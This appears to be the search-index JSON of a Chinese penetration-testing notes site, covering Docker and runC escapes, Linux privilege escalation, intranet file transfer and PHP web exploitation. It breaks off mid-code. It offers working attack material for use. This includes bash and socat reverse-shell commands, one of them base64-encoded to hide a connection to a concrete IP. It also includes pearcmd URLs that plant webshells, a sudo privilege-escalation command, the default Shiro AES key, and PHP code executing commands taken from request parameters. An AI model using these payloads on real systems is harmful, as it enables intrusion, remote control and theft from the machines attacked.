最后，在容器内运行一个可以崩溃的程序即可，例如：\n# include \u0026lt;stdio.h\u0026gt; int main(void) { int *a = NULL; *a = 1; return 0; } 可以在其他机器上编译好以后再上传到容器里\n方法二：使用CDK # https://github.com/cdk-team/CDK/releases/\n./cdk eva 发现容器挂载了宿主机的procfs\n执行命令\n./cdk run mount-procfs /host/proc $command 六. 脏牛漏洞实现Docker逃逸 # Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。\n竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。\n在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。\n漏洞条件 # docker与宿主机共享内核，如果要触发这个漏洞，需要宿主机存在dirtyCow漏洞的宿主机。\n七. runC容器逃逸漏洞 # runc是Docker、CRI-O、Containerd、Kubernetes等底层的容器运行时\n1. CVE-2019-5736 # 影响版本 # Docker Version \u0026lt;=18.09.2 runC Version \u0026lt;=1.0-rc6\n漏洞利用 # https://github.com/Frichetten/CVE-2019-5736-PoC\n或使用CDK\n2. CVE-2021-30465 # https://cactusii.github.io/post/cve-2021-30465-runc-tao-yi-lou-dong/\nhttps://cloud.tencent.com/developer/article/1835722\n存在一定的机率问题，使用docker等单个容器管理很难看到效果\n影响版本 # runc \u0026lt;= 1.0.0-rc94\n3. CVE-2024-21626 # https://nitroc.org/posts/cve-2024-21626-illustrated\n影响版本 # runC 大于等于 v1.0.0-rc93，小于等于 1.1.11。\ncontainerd 的已修复版本为 1.6.28 和 1.7.13。受影响版本范围为 1.4.7 到 1.6.27 和 1.7.12。\ndocker 的已修复版本为 25.0.2。\n八. CVE-2020-15257逃逸 # https://www.freebuf.com/vuls/259292.html\n2020年12月01日，Containerd 官方发布安全更新，修复了 Docker 容器逃逸漏洞（CVE-2020-15257）。 Containerd 是一个控制 runC 的守护进程，提供命令行客户端和API，用于在一个机器上管理容器。在特定网络条件下，攻击者可通过访问containerd-shim API，从而实现Docker容器逃逸。Containerd是行业标准的容器运行时，可作为Linux和Windows的守护程序使用。在版本1.3.9和1.4.3之前的容器中，容器填充的API不正确地暴露给主机网络容器。填充程序的API套接字的访问控制验证了连接过程的有效UID为0，但没有以其他方式限制对抽象Unix域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效UID为0，但特权降低）导致新进程以提升的特权运行。\n由于在host模式下，容器与host共享一套Network namespaces，此时containerd-shim API暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问。所以当一个容器root权限，且容器的网络模式为\u0026ndash;net=host的时候，通过ontainerd-shim API可以达成容器逃逸的目的。\n影响版本 # containerd \u0026lt; 1.4.3 containerd \u0026lt; 1.3.9\n漏洞利用 # https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn\n"},{"id":21,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86/","title":"密码收集","section":"Docs","content":" 密码收集 # "},{"id":22,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/","title":"扫描工具","section":"Docs","content":" 内网扫描工具 # fscan # https://github.com/shadow1ng/fscan\n"},{"id":23,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/","title":"文件传输","section":"Docs","content":" 内网文件传输 # nc + cat # 发送端 # nc -lvnp 7777 \u0026lt; file.txt 接收端 # cat \u0026lt; /dev/tcp/sender_ip/7777 \u0026gt; file.txt python # python2 # python -m SimpleHTTPServer 8080 python3 # python3 -m http.server 8080 nc # https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/\nhttps://nmap.org/ncat/guide/ncat-file-transfer.html\nscp # scp file.txt user@host:/path rsync # rsync -avz -e ssh file.txt user@host:/path wget # wget http://example.com/file.txt curl # curl -O http://example.com/file.txt tftp # tftp tftp\u0026gt; connect tftp\u0026gt; get file.txt ftp # ftp ftp\u0026gt; open ftp\u0026gt; get file.txt smbclient # smbclient //host/share smb: \\\u0026gt; get file.txt smbget # smbget -R smb://host/share "},{"id":24,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0/","title":"相关文章","section":"Docs","content":" 内网相关链接 # Active Directory \u0026amp; Kerberos Abuse # https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/\n域控常见打法总结 # https://mp.weixin.qq.com/s/Td3FIuvDZ1aofro6nCaQLw\n史上最强内网渗透知识点总结 # https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==\u0026mid=2247487491\u0026idx=1\u0026sn=270336c6cca79b4a4e5d777d41ce71b7\u0026chksm=ec1e202bdb69a93\n"},{"id":25,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/CS%E9%9A%90%E5%8C%BF/CobaltStrike+CDN/","title":"Cobalt Strike Cdn","section":"Docs","content":" CS CDN 隐匿 # 获取源服务器证书，pem+key # openssl pkcs12 -export -in $yourname.pem -inkey $yourname.key -out keystore.p12 -name \u0026#34;$yourname\u0026#34; keytool -importkeystore -deststorepass $yourpassword -destkeypass $yourpassword -destkeystore $yourname.store -srckeystore keystore.p12 -srcstoretype PKCS12 -srcstorepass $yourpassword -alias \u0026#34;$yourname\u0026#34; "},{"id":26,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/PHP%E5%86%85%E5%AD%98%E9%A9%AC/","title":"Php内存马","section":"Docs","content":" PHP 内存马 # https://mp.weixin.qq.com/s/KUA531d_3PKDsUSVgvX0CQ\n"},{"id":27,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/WebShell%E5%85%8D%E6%9D%80/","title":"Web Shell免杀","section":"Docs","content":" WebShell免杀 # https://github.com/AabyssZG/WebShell-Bypass-Guide\n"},{"id":28,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/","title":"免杀","section":"Docs","content":" 免杀 # https://github.com/icyguider/Shhhloader\n"},{"id":29,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/","title":"Linux提权","section":"Docs","content":" Linux提权 # https://book.hacktricks.xyz/linux-hardening/privilege-escalation\n自动化工具 # Traitor # Automatically exploit low-hanging fruit to pop a root shell. Linux privilege escalation made easy!\nLinux 自动化提权二进制文件 交互式 https://github.com/liamg/traitor PEASS-ng # Privilege Escalation Awesome Scripts SUITE new generation\nlinPEAS and winPEAS are powerful scripts that search for possible paths to escalate privileges on Windows and Linux/Unix* hosts. Linux\u0026amp;Windows 提权漏洞探测脚本 https://github.com/carlospolop/PEASS-ng sudo su # 如果当前用户有sudo权限，可以使用sudo su提权\nSUID 提权 # https://securiumsolutions.com/privilege-escalation-with-suid-in-linux/\nSUID 提权是一种利用 Linux 系统中具有 SUID 权限的文件来获取 root 权限的技术。SUID（Set User ID）是一种特殊的文件权限，它可以让用户以文件所有者的身份运行该文件。如果该文件的所有者是 root 用户，那么运行该文件的用户就可以暂时获得 root 权限，从而执行一些需要高权限的操作。\n如果设置了 GUID 位，那么运行该文件的用户就可以暂时获得文件所属组的权限。\nSUID 提权的前提条件是：\n文件的所有者是 root 用户或其他超级用户 文件具有 SUID 权限（即文件权限中有 s 位） 文件是二进制可执行文件，且能够执行命令操作 chmod u+s filename #设置 SUID 位 chmod u-s filename #去掉 SUID 设置 find / -perm -u=s -type f 2\u0026gt;/dev/null # 在 Linux 系统中用于查找具有\u0026#34;SetUID\u0026#34;权限位设置的可执行文件的命令 # -perm 表示按照文件权限来搜索 # -u=s 表示查找具有\u0026#34;SetUID\u0026#34;权限位的文件 # -type f: 这个选项告诉 find 命令只查找普通文件，而不是目录或其他类型的文件。 # 2\u0026gt;/dev/null: 这是一个重定向操作，将标准错误输出（stderr）重定向到/dev/null，这样可以将任何错误消息静默化，以便只输出符合条件的文件列表。 # SUID find / -perm -4000 -type f -ls 2\u0026gt;/dev/null # GUID find / -perm -2000 -type f -ls 2\u0026gt;/dev/null 已知可用来提权的 linux 文件 # nmap vim find bash more less nano cp awk \u0026hellip; 内核漏洞提权 # SUDO提权 # CVE-2019-14287 # sudo版本小于1.8.28\nsudo切换用户：sudo -u jack /bin/bash或sudo -u#1000 /bin/bash\nexp：sudo -u#-1 /bin/bash\n-1被sudo解释成0\nsudo -l # sudo -l https://gtfobins.github.io/\n计划任务提权 # cat /etc/crontab 定时任务\n查看文件权限\nls -l /etc/cron* NFS 提权 # Capabilities 位提权 # https://www.cnblogs.com/sparkdev/p/11417781.html\n探查有 CAP_SETUID 标志的进程 /sbin/getgap -r / 2\u0026gt;/dev/null\ncapability 名称 描述 CAP_AUDIT_CONTROL 启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则 CAP_AUDIT_READ 允许通过 multicast netlink 套接字读取审计日志 CAP_AUDIT_WRITE 将记录写入内核审计日志 CAP_BLOCK_SUSPEND 使用可以阻止系统挂起的特性 CAP_CHOWN 修改文件所有者的权限 CAP_DAC_OVERRIDE 忽略文件的 DAC 访问限制 CAP_DAC_READ_SEARCH 忽略文件读及目录搜索的 DAC 访问限制 CAP_FOWNER 忽略文件属主 ID 必须和进程用户 ID 相匹配的限制 CAP_FSETID 允许设置文件的 setuid 位 CAP_IPC_LOCK 允许锁定共享内存片段 CAP_IPC_OWNER 忽略 IPC 所有权检查 CAP_KILL 允许对不属于自己的进程发送信号 CAP_LEASE 允许修改文件锁的 FL_LEASE 标志 CAP_LINUX_IMMUTABLE 允许修改文件的 IMMUTABLE 和 APPEND 属性标志 CAP_MAC_ADMIN 允许 MAC 配置或状态更改 CAP_MAC_OVERRIDE 覆盖 MAC(Mandatory Access Control) CAP_MKNOD 允许使用 mknod() 系统调用 CAP_NET_ADMIN 允许执行网络管理任务 CAP_NET_BIND_SERVICE 允许绑定到小于 1024 的端口 CAP_NET_BROADCAST 允许网络广播和多播访问 CAP_NET_RAW 允许使用原始套接字 CAP_SETGID 允许改变进程的 GID CAP_SETFCAP 允许为文件设置任意的 capabilities CAP_SETPCAP 参考 capabilities man page CAP_SETUID 允许改变进程的 UID CAP_SYS_ADMIN 允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等 CAP_SYS_BOOT 允许重新启动系统 CAP_SYS_CHROOT 允许使用 chroot() 系统调用 CAP_SYS_MODULE 允许插入和删除内核模块 CAP_SYS_NICE 允许提升优先级及设置其他进程的优先级 CAP_SYS_PACCT 允许执行进程的 BSD 式审计 CAP_SYS_PTRACE 允许跟踪任何进程 CAP_SYS_RAWIO 允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备 CAP_SYS_RESOURCE 忽略资源限制 CAP_SYS_TIME 允许改变系统时钟 CAP_SYS_TTY_CONFIG 允许配置 TTY 设备 CAP_SYSLOG 允许使用 syslog() 系统调用 CAP_WAKE_ALARM 允许触发一些能唤醒系统的东西（比如 CLOCK_BOOTTIME_ALARM 计时器） "},{"id":30,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/MySQL%E6%8F%90%E6%9D%83/","title":"My Sql提权","section":"Docs","content":" MySQL提权 # https://www.freebuf.com/articles/web/264790.html\nUDF提权 # MOF提权 # 启动项重启提权 # "},{"id":31,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/SQLServer%E6%8F%90%E6%9D%83/","title":"SQL Server提权","section":"Docs","content":" SQLServer提权 # xp_cmdshell提权 # sp_oacreate提权 # "},{"id":32,"href":"/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E8%BF%9C%E6%8E%A7/%E4%BC%98%E5%8C%96shell/","title":"优化shell","section":"Docs","content":" 优化 shell # Reverse Shell Cheat Sheet # https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/{ip}/{port} 0\u0026gt;\u0026amp;1\u0026#39; echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzUyLjEzOS4xNTYuMzMvNDQ0NCAwPiYxJw== | base64 -d | bash Upgrading Simple Shells to Fully Interactive TTYs # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/\n交互式 shell # 设置环境变量 # export TERM=xterm-256color python pty # dpkg -l | grep python which python whereis python 查看是否有 python 环境\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; 可以实现简单的 tty，但是这种方式有个问题，当我们 Ctrl+C 的时候，所有连接都会断掉，又需要重新来一遍，而且 vim 虽然可以用，也有点问题，同时没有记录，无法使用上方向键执行上条命令。\nUpgrading from netcat with magic # 首先，使用Python生成一个PTY。一旦bash在PTY中运行，用 Ctrl-Z 将shell放到后台。\n当 shell 处于后台时，现在检查当前终端和 STTY 信息，以便我们可以强制连接的 shell 与其匹配\n所需信息是 TERM 类型（“xterm-256color”）和当前 TTY 的大小（“rows 38; columns 116”）\n在仍然处于后台的情况下，现在将当前的STTY设置为原始类型，并使用以下命令告诉它回显输入字符:\nstty raw -echo 使用原始的stty，输入/输出会看起来很奇怪，你看不到下一个命令，但当你输入时，它们会被处理。\n使用 fg 将 shell 置于前台。它将重新打开反向 shell，但格式将会出错。最后，使用 reset 重新初始化终端。\n注意：我没有再次输入 nc 命令（因为它可能看起来像上面）。我实际输入了 fg ，但没有回显。 nc 命令是当前正在前台运行的作业。然后在netcat shell中输入了 reset 命令\n在 reset 之后，shell 应该再次看起来正常。最后一步是设置 shell、终端类型和 stty 大小，以匹配我们当前的 Kali 窗口（根据上面收集的信息）。\nexport SHELL=bash export TERM=xterm256-color stty rows 38 columns 116 最终结果是通过netcat连接实现的具有所有我们期望的功能的完全交互式TTY（包括制表补全、历史记录、作业控制等）。\nsocat (only linux) # socat 是类 Unix 系统下的一个工具，可以看作是 nc 的加强版。我们可以使用 socat 来传递完整的带有 tty 的 TCP 连接。缺点也很明显，只能在 linux 下面运行\n下载地址：https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat\n使用起来也很简单。\n攻击机：\n# 首先安装 sudo apt install socat # 执行 socat file:`tty`,raw,echo=0 tcp-listen:4444 目标机：\n# 把 socat 上传到目标机器上或者直接下载 # 64 位 wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat #32 位 wget https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx86.bin -O /tmp/socat #从攻击机下载 攻击机指令：python3 -m http.server 8888 # 运行 chmod +x /tmp/socat /tmp/socat exec:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane tcp:IP:4444 这种方式基本和 ssh 类似，ctrl+C 也不会直接断开。\n速查表 # 使用Python进行伪终端 # python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; 使用 socat # #Listener: socat file:`tty`,raw,echo=0 tcp-listen:4444 #Victim: socat exec:\u0026#39;bash -li\u0026#39;,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 使用stty选项 # # In reverse shell python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Ctrl-Z # In Kali echo $TERM stty -a stty raw -echo fg # In reverse shell reset export SHELL=bash export TERM=xterm-256color stty rows \u0026lt;num\u0026gt; columns \u0026lt;cols\u0026gt; "},{"id":33,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/Java/Fastjson/","title":"Fastjson","section":"Docs","content":" Fastjson # https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw\n"},{"id":34,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/Java/Shiro/","title":"Shiro","section":"Docs","content":" Shiro # 默认AES密钥：kPH+bIxk5D2deZiIxcaaaA==\n"},{"id":35,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/pear+register_argc_argv%E5%88%A9%E7%94%A8/","title":"Pear Register Argc Argv利用","section":"Docs","content":" pear+register_argc_argv 利用 # 假如存在以下环境：\n安装了 pear\n开启了 registerargcargv\n存在可控的 include $_GET[\u0026lsquo;f\u0026rsquo;](即使是 include $_GET[\u0026lsquo;f\u0026rsquo;].php)\n那么我们就可以通过上面的知识实现任意文件下载从而 getshell:\n//通过本地直接写入 webshell, 注意这里最好抓包然后用 burpsuite 或者直接 curl 执行，否则浏览器会将\u0026lt; ? \u0026gt; 转义 // config-create 可以直接创建配置文件，且第一个参数必须以/开头 http://ip:port/include.php?f=pearcmd\u0026amp;+config-create+/\u0026lt;?=phpinfo();?\u0026gt;+/tmp/evil.php // 通过远程直接下载 webshell // web 目录可写 - http://ip:port/include.php?f=pearcmd\u0026amp;+install+-R+/var/www/html+http://ip:port/evil.php - http://ip:port/tmp/pear/download/evil.php // tmp 目录可写 - http://ip:port/include.php?f=pearcmd\u0026amp;+install+-R+/tmp+http://ip:port/evil.php - http://ip:port/include.php?f=/tmp/pear/download/evil "},{"id":36,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/","title":"Php伪协议","section":"Docs","content":" PHP 伪协议 # 什么是伪协议 # 伪协议是 PHP 中的一种特殊的语法，用于访问各种资源，如文件、网络、数据库等。 伪协议的格式为：协议名：//参数，其中协议名是指定的，参数是根据不同的协议而不同的。 伪协议的使用方法有 file_get_contents(\u0026quot;伪协议：//参数\u0026quot;) include(\u0026quot;伪协议：//参数\u0026quot;) require(\u0026quot;伪协议：//参数\u0026quot;) 常见的伪协议 # file:// # \u0026ldquo;file://\u0026ldquo;协议用于读取本地文件，其参数为文件的路径。 例如：file:///etc/passwd，表示读取本地的/etc/passwd 文件。 http:// # \u0026ldquo;http://\u0026ldquo;协议用于读取远程文件，其参数为远程文件的 URL。 例如：http://www.baidu.com，表示读取百度的首页。 php:// # \u0026ldquo;php://\u0026ldquo;协议用于读取 PHP 的输入和输出流，其参数为输入输出流的类型。 例如：php://input，表示读取 PHP 的输入流；php://output，表示读取 PHP 的输出流。 例如：php://filter/read=convert.base64-encode/resource=/etc/passwd，表示读取/etc/passwd 文件的 base64 编码。 file_get_contents() 支持 php://input，可以 zip:// # \u0026ldquo;zip://\u0026ldquo;协议用于读取 ZIP 压缩文件中的文件，其参数为 ZIP 压缩文件的路径。 例如：zip://test.zip#test.txt，表示读取 test.zip 压缩文件中的 test.txt 文件。 phar:// # \u0026ldquo;phar://\u0026ldquo;协议用于读取 PHAR 压缩文件中的文件，其参数为 PHAR 压缩文件的路径。 例如：phar://test.phar/test.txt，表示读取 test.phar 压缩文件中的 test.txt 文件。 data://（php 5.2.0 起） # \u0026ldquo;data://\u0026ldquo;协议用于读取数据，其参数为数据的类型。 例如：data://text/plain;base64,SGVsbG8sIFdvcmxkIQ==，读取 base64 编码的字符串，返回解码后的值。 "},{"id":37,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%86%85%E7%BD%AE%E7%B1%BB/","title":"Php内置类","section":"Docs","content":" PHP 内置类 # SplFileObject # 与伪协议结合，可用于读取文件内容。\n\u0026lt;?php $file = new SplFileObject(\u0026#39;php://filter/read=convert.base64-encode/resource=/etc/passwd\u0026#39;); echo $file-\u0026gt;fread($file-\u0026gt;getSize()); ?\u0026gt; "},{"id":38,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","title":"Php反序列化漏洞","section":"Docs","content":" PHP 反序列化漏洞 # 序列化与反序列化 # 序列化 # serialize()\n序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。 对象-\u0026gt;字符串 序列化格式 # PHP 序列化格式：O: 类名长度：\u0026quot;类名\u0026quot;: 属性个数：{s: 属性名长度：\u0026quot;属性名\u0026quot;; 数据类型：属性值的长度：属性值；} 不同类型的变量序列化后的格式 # public 属性：s: 属性名长度：\u0026quot;属性名\u0026quot;; 数据类型：属性值的长度：属性值；\nprivate 属性：s: 属性名长度：\u0026quot;\\00 类名、00 属性名\u0026quot;; 数据类型：属性值的长度：属性值；\nprotected 属性：s: 属性名长度：\u0026quot;\\00*\\00 属性名\u0026quot;; 数据类型：属性值的长度：属性值；\n举例\n\u0026lt;?php class test{ public $name = \u0026#39;xiaohua\u0026#39;; private $address = \u0026#39;shanxi\u0026#39;; protected $age = \u0026#39;21\u0026#39;; } $test1 = new test(); $object = serialize($test1); print_r($object); ?\u0026gt; // output(space=\\00): O:4:\u0026#34;test\u0026#34;:3:{s:4:\u0026#34;name\u0026#34;;s:7:\u0026#34;xiaohua\u0026#34;;s:13:\u0026#34; test address\u0026#34;;s:6:\u0026#34;shanxi\u0026#34;;s:6:\u0026#34; * age\u0026#34;;s:2:\u0026#34;21\u0026#34;;} 数据类型对应字母 # 数据类型 字母 NULL N 布尔 b 整型 i 浮点型 d 字符串 s 数组 a 对象 O 资源 r 反序列化 # unserialize()\n字符串-\u0026gt;对象\n反序列化将字符串转换为对象时，不会触发该对象的构造函数，但会触发其__wakeup()方法。\n魔术方法 # 魔术方法触发前提：魔术方法所在类（或对象）被调用\n魔术方法 (magic method) 说明 __construct() 当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。（构造函数） __destruct() 当对象被销毁时会自动调用。（析构函数） __wakeup() 使用 unserialize 反序列化时自动调用 __sleep() 使用 serialize 序列化时自动调用 __set() 在给未定义的属性赋值时自动调用 __get() 调用未定义的属性时自动调用 __isset() 使用 isset() 或 empty() 函数时自动调用 __unset() 使用 unset() 时自动调用 __call() 调用一个不存在的方法时自动调用 __callStatic() 调用一个不存在的静态方法时自动调用 __toString() 把对象转换成字符串时自动调用 __invoke() 当尝试把对象当方法调用时自动调用 __set_state() 当使用 var_export() 函数时自动调用，接受一个数组参数 __clone() 当使用 clone 复制一个对象时自动调用 __debugInfo() 使用 var_dump() 打印对象信息时自动调用 什么是反序列化漏洞 # PHP 反序列化漏洞也叫 PHP 对象注入。漏洞的形成的根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell 等一系列不可控的后果。反序列化漏洞并不是 PHP 特有，也存在于 Java、Python 等语言之中，但其原理基本相通。 一般程序在创建的时候，都会重写析构函数和构造函数，反序列化漏洞就是利用这些重写的函数。 反序列化 POP 链 # 在反序列化中，我们所能控制的数据就是对象中的各个属性值，所以在 PHP 的反序列化中有一种漏洞利用方法叫做 “面向属性编程”，面向对象编程从一定程度上来说，就是完成类与类之间的调用。POP 链起于一些小的“组件”，这些小“组件”可以调用其他的“组件”，在 PHP 中，“组件”就是那些魔术方法（如：wakeup() 或 destruct） 利用条件 # unserialize() 函数的参数可控 php 中有可以利用的类并且类中有魔术方法 内容可控之后获取 flag # 函数名和函数内容可控 # \u0026lt;?php $a($b) ?\u0026gt; 命令执行函数 # 见\u0026lt;PHP 命令执行。md\u0026gt;\n执行系统命令 # system(\u0026quot;command\u0026quot;)：将字符串作为 OS 命令执行，自带输出功能。 passthru(\u0026quot;command\u0026quot;)：将字符串作为 OS 命令执行，不需要输出执行结果，且输出全部的内容。 exec(\u0026quot;command\u0026quot;)：将字符串作为 OS 命令执行，需要输出执行结果，且它只会输出最后一行的内容。 shell_exec(\u0026quot;command\u0026quot;)：将字符串作为 OS 命令执行，需要输出执行结果，且输出全部的内容。 文件读取函数 # show_source(\u0026quot;/flag\u0026quot;) 当遇到创建类可控时，可考虑使用内置类 # \u0026lt;?php echo new $a($b); ?\u0026gt; SplFileObject：可读取文件内容 POST a=SplFileObject\u0026amp;b=php://filter/read=convert.base64-encode/resource=flag.php\n__wakeup() 绕过（CVE-2016-7124） # 漏洞产生原因： 如果存在_wakeup 方法，调用 unserilize() 方法前则先调用__wakeup 方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过__wakeup() 的执行\n参考文章 # https://blog.csdn.net/cldimd/article/details/104999404 https://blog.csdn.net/qq_45521281/article/details/105891381 "},{"id":39,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"Php命令执行","section":"Docs","content":" PHP 命令执行 # 执行 PHP 代码函数 # eval(phpcode): 反序列化中无法使用，因为 php eval 是一个语言结构，和 echo 一样不属于函数，同理就算通过配置 disable_functions 也是禁用不了 eval 函数的\nassert(phpcode): php7 以前，因为 php7 中禁止了动态调用 assert。直接将传入的参数当成 PHP 代码执行，不需要以分号结尾（特别注意），有时加上分号不会显示结果\ncall_user_func(\u0026quot;assert\u0026quot;,phpcode)：传入的参数作为 assert 函数的参数\n执行系统命令函数 # system() # system(string $command, int \u0026amp;$return_var): string\ncommand: 要执行的命令\n有回显 exec() # exec(string $command, array \u0026amp;$output = null, int \u0026amp;$return_var = null): string\ncommand: 要执行的命令\noutput: 命令执行后的输出，每行一个元素，如果不设置，默认输出最后一行\n可以用 print_r() 打印数组\npassthru() # passthru(string $command, int \u0026amp;$return_var): void\ncommand: 要执行的命令\n输出二进制数据，需要直接传输到浏览器\nshell_exec() # shell_exec(string $cmd): string\n无回显，借助 echo、print 等函数输出： echo shell_exec(\u0026rsquo;ls\u0026rsquo;); ` 反引号 # command: 要执行的命令\n无回显，借助 echo、print 等函数输出： echo ls; popen() # popen(string $command, string $mode): resource\ncommand: 要执行的命令\nmode: 打开文件的模式，r 或 w\n使用 fgets() 或 fread() 读取文件内容，再用 echo、print_r() 打印\n\u0026lt;?php $cmd = $_GET[\u0026#39;cmd\u0026#39;]; $fp = popen($cmd, \u0026#39;r\u0026#39;); while ($s=fgets($fp)) { echo $s; } proc_open() # proc_open(string $cmd, array $descriptorspec, array \u0026amp;$pipes, ?string $cwd = null, ?array $env = null, ?array $other_options = null): resource\ncmd: 要执行的命令\ndescritorspec: 数组，指定要打开的文件描述符，0=\u0026gt;标准输入，1=\u0026gt;标准输出，2=\u0026gt;标准错误\npipes: 数组，存储打开的文件描述符\n$cmd = $_GET[\u0026#39;cmd\u0026#39;]; $descriptorspec = array( 0 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;r\u0026#39;), 1 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;), 2 =\u0026gt; array(\u0026#39;file\u0026#39;, \u0026#39;/tmp/error-output.txt\u0026#39;, \u0026#39;a\u0026#39;) ); $pipes = array(); $process = proc_open($cmd, $descriptorspec, $pipes); echo stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($process); pcntl_exec() # pcntl_exec(string $path, array $args = [], array $envs = []): void\npath: 必须是可执行文件的绝对路径或一个在第一行指定了一个可执行解释器的脚本（如#!/usr/bin/env php）。\nargs: 数组，参数列表\nenvs: 数组，环境变量\n\u0026lt;?php $cmd = $_GET[\u0026#39;cmd\u0026#39;]; pcntl_exec(\u0026#39;/bin/sh\u0026#39;, [\u0026#39;-c\u0026#39;, $cmd], []); LD_PRELOAD 绕过 # 程序的链接 # 静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。 装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。 运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。 对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。\nLD_PRELOAD # LD_PRELOAD 是一个环境变量，它指定了在程序运行前要加载的动态链接库。\nLD_PRELOAD 可以用来劫持系统调用，从而实现对程序的控制。\n绕过条件 # 能上传自己的。so 文件 能控制环境变量（如 LD_PRELOAD) 的值，比如 putenv() 函数且未被禁止 存在可以控制 PHP 启动外部程序的函数并能执行，比如 mail()、imap_mail()、mb_send_mail()、error_log() 等 可利用函数 # mail（内置函数） # mail 函数-\u0026gt;调用/user/bin/sendmail-\u0026gt;调用动态链接库 geteuid 函数\n给 geteuid 重新赋值\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void payload() { 